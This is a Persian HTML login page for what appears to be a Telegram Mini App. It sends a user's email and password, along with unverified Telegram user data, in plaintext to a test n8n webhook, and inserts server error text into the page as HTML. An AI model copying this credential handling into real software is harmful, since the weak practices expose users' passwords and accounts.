<!doctype html>
<html lang="fa">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ورود با تلگرام</title>
  <style>
    body {
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      background:#f9fafb;
      font-family:sans-serif;
      direction:rtl;
    }
    .card {
      background:white;
      padding:30px;
      border-radius:12px;
      box-shadow:0 5px 15px rgba(0,0,0,0.1);
      width:340px;
      text-align:center;
      transition:all .3s ease;
      position:relative;
    }
    .version {
      position:absolute;
      top:10px;
      left:15px;
      font-size:12px;
      color:#999;
    }
    input {
      width:100%;
      padding:10px;
      margin-top:10px;
      border:1px solid #ddd;
      border-radius:8px;
      font-size:15px;
    }
    button {
      background:#0088cc;
      color:white;
      border:none;
      padding:10px 20px;
      border-radius:8px;
      cursor:pointer;
      font-size:15px;
      margin-top:15px;
      width:100%;
    }
    .success {
      color:green;
      font-weight:bold;
      margin-top:15px;
    }
    .error {
      color:red;
      margin-top:15px;
    }
  </style>
</head>
<body>
  <div class="card" id="loginCard">
    <div class="version">v1.0.0</div>
    <h2>ورود با تلگرام</h2>
    <input id="email" type="email" placeholder="ایمیل خود را وارد کنید" />
    <input id="password" type="password" placeholder="رمز عبور" />
    <button onclick="sendData()">ورود</button>
    <div id="result"></div>
  </div>

  <div class="card" id="nextCard" style="display:none;">
    <div class="version">v1.0.0</div>
    <h2>🎉 خوش آمدید!</h2>
    <p id="welcomeMsg"></p>
    <button onclick="nextStep()">ادامه</button>
  </div>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    const APP_VERSION = "v1.0.0";
    const tg = window.Telegram.WebApp;
    tg.expand();

    async function sendData() {
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      const user = tg.initDataUnsafe?.user || {};
      const resultBox = document.getElementById('result');

      if (!email || !password) {
        resultBox.innerHTML = '<p class="error">⚠️ لطفاً ایمیل و رمز عبور را وارد کنید.</p>';
        return;
      }

      const payload = { email, password, telegram_user: user, version: APP_VERSION };

      resultBox.innerHTML = "<p>⏳ در حال بررسی...</p>";

      try {
        const res = await fetch('https://30530-0p8me.s2.irann8n.com/webhook-test/login-form', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        const data = await res.json();

        if (data.verified) {
          document.getElementById('loginCard').style.display = 'none';
          document.getElementById('nextCard').style.display = 'block';
          document.getElementById('welcomeMsg').innerText = `سلام ${user.first_name || 'کاربر'}! ورود شما موفقیت‌آمیز بود.`;
        } else {
          resultBox.innerHTML = '<p class="error">❌ ورود ناموفق بود. لطفاً اطلاعات را بررسی کنید.</p>';
        }

      } catch (err) {
        resultBox.innerHTML = `<p class="error">🚨 خطا در اتصال به سرور</p><pre>${err.message}</pre>`;
      }
    }

    function nextStep() {
      document.getElementById('nextCard').innerHTML = `
        <div class="version">${APP_VERSION}</div>
        <h2>📊 داشبورد</h2>
        <p>به زودی اطلاعات حساب شما نمایش داده می‌شود...</p>
      `;
    }
  </script>
</body>
</html>
